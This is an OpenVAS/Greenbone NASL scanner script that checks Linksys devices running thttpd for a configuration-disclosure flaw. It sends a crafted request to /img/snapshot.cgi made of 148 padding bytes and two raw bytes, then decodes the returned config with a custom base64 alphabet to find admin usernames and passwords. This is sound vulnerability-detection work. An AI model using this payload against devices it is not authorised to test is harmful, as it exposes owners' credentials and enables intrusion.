# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:acme:thttpd";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105105");
  script_version("2025-06-25T05:41:02+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-06-25 05:41:02 +0000 (Wed, 25 Jun 2025)");
  script_tag(name:"creation_date", value:"2014-11-04 13:38:34 +0100 (Tue, 04 Nov 2014)");
  script_name("Multiple Linksys Products Information Disclosure (Nov 2014) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_thttpd_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("thttpd/detected");

  script_xref(name:"URL", value:"https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf");

  script_tag(name:"summary", value:"Multiple Linksys products are prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker read the config of
  the device including usernames and passwords.");

  script_tag(name:"affected", value:"Multiple Linksys products are known to be affected. Other
  vendors might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

# nb:
# - http_report_vuln_url() used below might fork on multiple hostnames and should be always before
#   the first http_send_recv() call
# - For simplicity we're just calling get_host_name() directly here as it will also fork
http_host_name( port:port );

payload = crap( data:"A", length:148 ) + raw_string( 0x88, 0x9B );

url = "/img/snapshot.cgi?" + payload;
req = "GET " + url + ' HTTP/1.0\r\n\r\n';
result = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Content-type: application/configuration" >!< result )
  exit( 99 );

buf = split( result, sep:'\r\n\r\n', keep:FALSE );
if( isnull( buf[2] ) )
  exit( 0 );

decoded_config = base64_decode( str:buf[2], key_str:"ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+/" );

if( "admin_name" >< decoded_config || "admin_password" >< decoded_config ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
